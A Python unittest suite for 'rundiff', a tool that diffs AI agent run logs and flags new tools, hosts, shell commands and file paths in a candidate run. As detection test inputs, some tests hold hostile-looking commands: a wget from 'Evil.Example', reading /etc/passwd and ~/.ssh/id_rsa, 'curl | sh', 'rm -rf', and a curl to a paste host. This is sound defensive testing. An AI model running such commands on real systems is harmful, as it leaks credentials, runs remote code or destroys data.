import io
import json
import os
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)
import rundiff  # noqa: E402

EX = os.path.join(ROOT, "examples")
BASE = os.path.join(EX, "baseline.jsonl")
CAND = os.path.join(EX, "candidate.jsonl")


def run_from(records, fmt="auto", ignore=()):
    return rundiff.build_run(records, fmt, ignore, "<t>")


def generic(calls, final="done"):
    recs = [{"type": "user", "content": "go"}]
    for i, (tool, args, res) in enumerate(calls):
        recs.append({"type": "tool_call", "id": "g%d" % i, "tool": tool, "args": args})
        recs.append({"type": "tool_result", "id": "g%d" % i, "result": res})
    recs.append({"type": "final", "content": final})
    return recs


def write_tmp(obj, jsonl=True):
    fd, p = tempfile.mkstemp(suffix=".jsonl" if jsonl else ".json")
    with os.fdopen(fd, "w") as f:
        if jsonl:
            for r in obj:
                f.write(json.dumps(r) + "\n")
        else:
            json.dump(obj, f)
    return p


def cli(*args):
    out = io.StringIO()
    code = rundiff.main(list(args), stdout=out)
    return code, out.getvalue()


ANTHROPIC = [
    {"role": "user", "content": "weather?"},
    {"role": "assistant", "content": [
        {"type": "text", "text": "Checking."},
        {"type": "tool_use", "id": "tu1", "name": "http_get", "input": {"url": "https://api.weather.example/v1?q=nyc"}}],
     "usage": {"input_tokens": 100, "output_tokens": 20}},
    {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "tu1",
                                  "content": [{"type": "text", "text": "72F sunny"}]}]},
    {"role": "assistant", "content": [{"type": "text", "text": "It is 72F and sunny."}],
     "usage": {"input_tokens": 130, "output_tokens": 10}},
]


class TestDetectAndParse(unittest.TestCase):
    def test_detect_openai(self):
        self.assertEqual(rundiff.detect_format(rundiff.load_records(BASE)), "openai")

    def test_detect_anthropic(self):
        self.assertEqual(rundiff.detect_format(ANTHROPIC), "anthropic")

    def test_detect_generic(self):
        self.assertEqual(rundiff.detect_format(generic([("a", {}, "x")])), "generic")

    def test_openai_extraction(self):
        r = run_from(rundiff.load_records(BASE))
        self.assertEqual([c.tool for c in r.calls], ["search_docs", "read_file", "run_shell", "list_dir"])
        self.assertEqual(r.calls[0].args["limit"], 5)
        self.assertIn("Faster sync", r.calls[1].result)
        self.assertTrue(r.final_answer.startswith("v2.3 brings"))
        self.assertEqual(r.assistant_turns, 5)
        self.assertEqual(r.user_turns, 1)

    def test_openai_tokens(self):
        r = run_from(rundiff.load_records(BASE))
        self.assertTrue(r.has_usage)
        self.assertEqual(r.tokens["input"], 3030)
        self.assertEqual(r.tokens["total"], 3030 + 143)

    def test_anthropic_extraction(self):
        r = run_from(ANTHROPIC)
        self.assertEqual(len(r.calls), 1)
        self.assertEqual(r.calls[0].tool, "http_get")
        self.assertEqual(r.calls[0].result, "72F sunny")
        self.assertEqual(r.final_answer, "It is 72F and sunny.")
        self.assertEqual(r.user_turns, 1)  # tool_result user msg not counted
        self.assertEqual(r.tokens["output"], 30)

    def test_generic_extraction(self):
        r = run_from(generic([("search", {"q": "x"}, "r1"), ("fetch", {"u": 1}, {"k": 2})], final="ok"))
        self.assertEqual([c.tool for c in r.calls], ["search", "fetch"])
        self.assertEqual(r.calls[1].result, '{"k": 2}')
        self.assertEqual(r.final_answer, "ok")

    def test_generic_result_without_id_pairs_in_order(self):
        recs = [{"type": "tool_call", "tool": "a", "args": {}},
                {"type": "tool_result", "result": "ra"}]
        r = run_from(recs)
        self.assertEqual(r.calls[0].result, "ra")

    def test_json_document_with_messages_key(self):
        p = write_tmp({"messages": ANTHROPIC, "usage": {"input_tokens": 5}}, jsonl=False)
        try:
            recs = rundiff.load_records(p)
            r = run_from(recs)
            self.assertEqual(len(r.calls), 1)
            self.assertEqual(r.tokens["input"], 235)
        finally:
            os.unlink(p)

    def test_json_list_document(self):
        p = write_tmp(ANTHROPIC, jsonl=False)
        try:
            self.assertEqual(len(rundiff.load_records(p)), 4)
        finally:
            os.unlink(p)

    def test_string_args_not_json(self):
        c = rundiff.Call(0, "t", "not json")
        self.assertEqual(c.raw_args, {"_raw": "not json"})

    def test_invalid_jsonl_raises(self):
        with self.assertRaises(rundiff.RundiffError):
            rundiff.parse_records('{"a":1}\n{bad')

    def test_empty_raises(self):
        with self.assertRaises(rundiff.RundiffError):
            rundiff.parse_records("   ")

    def test_envelope_unwrap(self):
        recs = rundiff.parse_records(json.dumps({"message": {"role": "assistant", "content": "hi"},
                                                 "usage": {"prompt_tokens": 3, "completion_tokens": 1}}))
        r = run_from(recs)
        self.assertEqual(r.final_answer, "hi")
        self.assertEqual(r.tokens["total"], 4)


class TestDiffCore(unittest.TestCase):
    def setUp(self):
        self.base = run_from(rundiff.load_records(BASE), ignore=["request_id", "took_ms"])
        self.cand = run_from(rundiff.load_records(CAND), ignore=["request_id", "took_ms"])
        self.rep = rundiff.diff_runs(self.base, self.cand)

    def test_removed_call(self):
        self.assertEqual([x["tool"] for x in self.rep["removed"]], ["list_dir"])

    def test_added_calls(self):
        self.assertEqual(sorted(x["tool"] for x in self.rep["added"]), ["run_shell", "write_file"])

    def test_arg_change_with_ignore(self):
        self.assertEqual(len(self.rep["arg_changes"]), 1)
        ch = self.rep["arg_changes"][0]["changes"]
        self.assertEqual(ch, [{"path": "limit", "change": "changed", "old": 5, "new": 20}])

    def test_ignore_keys_removes_result_divergence(self):
        self.assertEqual(self.rep["result_divergence"], [])

    def test_without_ignore_keys_volatile_fields_show(self):
        b = run_from(rundiff.load_records(BASE))
        c = run_from(rundiff.load_records(CAND))
        rep = rundiff.diff_runs(b, c)
        paths = [x["path"] for x in rep["arg_changes"][0]["changes"]]
        self.assertIn("request_id", paths)
        self.assertEqual(len(rep["result_divergence"]), 1)

    def test_final_answer_similarity(self):
        fa = self.rep["final_answer"]
        self.assertFalse(fa["identical"])
        self.assertTrue(0.0 < fa["similarity"] < 1.0)

    def test_new_surface_flags(self):
        kinds = {(f["kind"], f["value"]) for f in self.rep["new_surface"]}
        self.assertIn(("tool", "write_file"), kinds)
        self.assertIn(("host", "paste.unfamiliar-host.example"), kinds)
        self.assertIn(("command", "curl"), kinds)
        self.assertIn(("path", "/tmp/agent-out/summary.md"), kinds)
        self.assertIn(("dir", "/tmp/agent-out"), kinds)
        self.assertNotIn(("command", "git"), kinds)
        for f in self.rep["new_surface"]:
            self.assertIn("heuristic", f["risk_note"])

    def test_stats(self):
        self.assertEqual(self.rep["baseline"]["stats"]["calls"], 4)
        self.assertEqual(self.rep["candidate"]["stats"]["calls"], 5)
        self.assertEqual(self.rep["candidate"]["stats"]["unique_tools"], 4)

    def test_identical_runs(self):
        rep = rundiff.diff_runs(self.base, self.base)
        self.assertFalse(rep["has_differences"])
        self.assertEqual(rep["final_answer"]["similarity"], 1.0)
        self.assertEqual(rundiff.gate(rep, "any"), 0)

    def test_reordered(self):
        b = run_from(generic([("a", {}, "1"), ("b", {}, "2"), ("c", {}, "3")]))
        c = run_from(generic([("c", {}, "3"), ("a", {}, "1"), ("b", {}, "2")]))
        rep = rundiff.diff_runs(b, c)
        self.assertEqual([x["tool"] for x in rep["reordered"]], ["c"])
        self.assertEqual(rep["added"], [])
        self.assertEqual(rep["removed"], [])
        self.assertEqual(rep["new_surface"], [])

    def test_result_divergence(self):
        b = run_from(generic([("a", {"x": 1}, "one")]))
        c = run_from(generic([("a", {"x": 1}, "two")]))
        rep = rundiff.diff_runs(b, c)
        self.assertEqual(len(rep["result_divergence"]), 1)
        self.assertEqual(rep["arg_changes"], [])

    def test_whitespace_only_result_change_not_divergent(self):
        b = run_from(generic([("a", {}, "one  two")]))
        c = run_from(generic([("a", {}, "one two\n")]))
        self.assertEqual(rundiff.diff_runs(b, c)["result_divergence"], [])

    def test_ignore_keys_glob(self):
        b = run_from(generic([("a", {"x": 1, "created_at": "t1"}, "r")]), ignore=["*_at"])
        c = run_from(generic([("a", {"x": 1, "created_at": "t2"}, "r")]), ignore=["*_at"])
        self.assertEqual(rundiff.diff_runs(b, c)["arg_changes"], [])


class TestHelpers(unittest.TestCase):
    def test_json_diff_nested(self):
        d = rundiff.json_diff({"a": {"b": 1, "c": 2}, "l": [1, 2]}, {"a": {"b": 1, "d": 3}, "l": [1, 3]})
        got = {(x["path"], x["change"]) for x in d}
        self.assertEqual(got, {("a.c", "removed"), ("a.d", "added"), ("l[1]", "changed")})

    def test_json_diff_list_length_change(self):
        d = rundiff.json_diff({"l": [1]}, {"l": [1, 2]})
        self.assertEqual(d[0]["path"], "l")

    def test_extract_hosts(self):
        h = rundiff.extract_hosts({"cmd": "wget http://Evil.Example:8080/x && curl https://ok.example/a"})
        self.assertEqual(h, {"evil.example", "ok.example"})

    def test_extract_paths_from_key_and_text(self):
        p = rundiff.extract_paths({"path": "notes.txt", "cmd": "cat /etc/passwd ~/.ssh/id_rsa"})
        self.assertIn("notes.txt", p)
        self.assertIn("/etc/passwd", p)
        self.assertIn("~/.ssh/id_rsa", p)

    def test_url_not_counted_as_path(self):
        p = rundiff.extract_paths({"cmd": "curl https://h.example/a/b/c"})
        self.assertEqual(p, set())

    def test_command_programs(self):
        self.assertEqual(rundiff.command_programs("FOO=1 sudo /usr/bin/curl -s x | sh && ls -la"),
                         ["curl", "sh", "ls"])

    def test_shell_tool_without_command_key(self):
        c = rundiff.Call(0, "bash", {"input": "rm -rf /tmp/x"})
        c.finalize([])
        self.assertEqual(rundiff.extract_commands(c), ["rm -rf /tmp/x"])

    def test_gate_modes(self):
        rep = {"has_differences": True, "arg_changes": [], "new_surface": [1]}
        self.assertEqual(rundiff.gate(rep, "none"), 0)
        self.assertEqual(rundiff.gate(rep, "any"), 1)
        self.assertEqual(rundiff.gate(rep, "args"), 0)
        self.assertEqual(rundiff.gate(rep, "new-surface"), 1)


class TestCLI(unittest.TestCase):
    def test_text_output_no_color(self):
        code, out = cli(BASE, CAND, "--no-color")
        self.assertEqual(code, 0)
        self.assertIn("New surface", out)
        self.assertIn("paste.unfamiliar-host.example", out)
        self.assertNotIn("\033[", out)

    def test_json_output(self):
        code, out = cli(BASE, CAND, "--json", "--ignore-keys", "request_id,took_ms")
        data = json.loads(out)
        self.assertEqual(code, 0)
        self.assertEqual(data["exit_code"], 0)
        self.assertEqual(len(data["arg_changes"]), 1)

    def test_fail_on_any(self):
        self.assertEqual(cli(BASE, CAND, "--fail-on", "any")[0], 1)

    def test_fail_on_new_surface(self):
        self.assertEqual(cli(BASE, CAND, "--fail-on", "new-surface")[0], 1)

    def test_fail_on_args(self):
        self.assertEqual(cli(BASE, CAND, "--fail-on", "args")[0], 1)

    def test_fail_on_any_identical_is_zero(self):
        self.assertEqual(cli(BASE, BASE, "--fail-on", "any")[0], 0)

    def test_missing_file_exit_2(self):
        self.assertEqual(cli(BASE, "/nonexistent/x.jsonl")[0], 2)

    def test_bad_arg_exit_2(self):
        import contextlib
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(cli(BASE, CAND, "--fail-on", "bogus")[0], 2)

    def test_subprocess_exit_codes(self):
        exe = [sys.executable, os.path.join(ROOT, "rundiff.py")]
        r = subprocess.run(exe + [BASE, CAND, "--fail-on", "new-surface", "--no-color"],
                           capture_output=True, text=True)
        self.assertEqual(r.returncode, 1)
        r = subprocess.run(exe + [BASE, "/nope"], capture_output=True, text=True)
        self.assertEqual(r.returncode, 2)
        self.assertIn("error", r.stderr)


if __name__ == "__main__":
    unittest.main()
